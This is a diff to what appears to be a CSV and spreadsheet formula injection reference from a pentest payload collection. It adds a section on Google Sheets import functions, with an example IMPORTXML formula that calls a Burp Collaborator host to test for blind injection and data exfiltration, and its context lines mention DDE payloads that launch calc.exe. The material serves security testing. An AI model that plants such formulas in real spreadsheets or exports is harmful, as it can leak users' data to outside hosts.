@@ -6,6 +6,7 @@
 ## Summary
 
 * [Methodology](#methodology)
+  * [Google Sheets](#google-sheets)
 * [References](#references)
 
 
@@ -60,6 +61,23 @@ Technical details of the above payloads:
 - `/C` calc is the file name which in our case is the calc(i.e the calc.exe)
 - `!A0` is the item name that specifies unit of data that a server can respond when the client is requesting the data
 
+### Google Sheets
+
+Google Sheets allows some additionnal formulas that are able to fetch remote URLs:
+
+* [IMPORTXML](https://support.google.com/docs/answer/3093342?hl=en)(url, xpath_query, locale)
+* [IMPORTRANGE](https://support.google.com/docs/answer/3093340)(spreadsheet_url, range_string)
+* [IMPORTHTML](https://support.google.com/docs/answer/3093339)(url, query, index)
+* [IMPORTFEED](https://support.google.com/docs/answer/3093337)(url, [query], [headers], [num_items])
+* [IMPORTDATA](https://support.google.com/docs/answer/3093335)(url)
+
+So one can test blind formula injection or a potential for data exfiltration with:
+
+```
+=IMPORTXML("http://burp.collaborator.net/csv", "//a/@href")
+```
+
+Note: an alert will warn the user a formula is trying to contact an external ressource and ask for authorization.
 
 ## References
 
